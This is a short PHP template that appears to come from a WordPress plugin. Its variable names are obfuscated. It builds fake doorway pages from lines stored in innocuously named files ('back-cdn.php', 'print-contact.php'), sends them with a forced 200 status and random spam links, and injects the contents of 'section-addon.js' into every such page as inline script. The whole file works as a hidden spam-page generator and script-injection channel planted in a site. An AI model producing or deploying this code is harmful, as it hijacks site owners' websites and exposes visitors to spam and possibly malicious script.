<?php
$wilY3QYX = intval(get_query_var('dgyrzwoxwq'));

if ($wilY3QYX < 1 || $wilY3QYX > 4585) return;
$ntE2Qoc = file(plugin_dir_path(__FILE__).'back-cdn.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$kND2c = explode(';', $ntE2Qoc[$wilY3QYX]);
if (count($kND2c) < 2) return;
$y1TUteo = $kND2c[0];
$dxmMtG  = $kND2c[1];
$luuet27 = $kND2c[2];
$zMQ1GlC  = $kND2c[3];
$uqoVv = $kND2c[4];
set_query_var('jngyur', $y1TUteo);

$ymw09OmaCI = '';
$wffPC = plugin_dir_path(__FILE__).'print-contact.php';
if (is_file($wffPC)) {
	$uoBFT = file($wffPC, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($uoBFT);
	shuffle($uoBFT);
	$zlyPnhU22 = mt_rand(2, 5);
	if (count($uoBFT) > $zlyPnhU22) {
		for ($hsPIbpyL = 0; $hsPIbpyL < $zlyPnhU22; $hsPIbpyL++) {
			$plwdxH68K = array_shift($uoBFT);
			$ymw09OmaCI .= '<p><a href="'.$plwdxH68K.'">'.$plwdxH68K.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $y1TUteo; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $dxmMtG . "</p>\n";
				if (strlen($zMQ1GlC) > 0) echo "<p>" . $zMQ1GlC . "</p>\n";
				if (strlen($luuet27) > 0) echo "<p>" . $luuet27 . "</p>\n";
				if (strlen($uqoVv) > 0) echo '<p><a href="#"><img src="'.$uqoVv.'"></a>' . "</p>\n";
				echo $ymw09OmaCI;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$wJN1WYB = plugin_dir_path(__FILE__) . 'section-addon.js';
if (is_file($wJN1WYB)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($wJN1WYB);
	echo '</script>';
}
get_footer();
?>
